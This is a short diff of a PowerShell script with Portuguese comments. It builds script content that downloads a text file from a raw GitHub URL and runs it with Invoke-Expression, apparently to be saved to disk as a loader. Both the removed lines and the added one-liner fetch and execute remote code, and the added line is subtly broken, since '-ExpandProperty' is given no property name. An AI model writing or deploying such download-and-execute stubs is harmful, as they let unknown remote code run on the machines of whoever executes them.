@@ -1,15 +1,6 @@
 # Define o conteúdo do script
 $scriptContent = @"
-# Define o URL do script a ser baixado e executado
-$url = "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt"
-
-
-    # Baixa o conteúdo do URL
-    scriptContent = Invoke-WebRequest -Uri $url -ErrorAction Stop | Select-Object -ExpandProperty Content
-    
-    # Executa o conteúdo do script baixado
-    Invoke-Expression -Command $scriptContent
-
+    Invoke-Expression -Command (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt" -ErrorAction Stop | Select-Object -ExpandProperty).Content
 "@
 
 # Define o caminho completo para salvar o arquivo
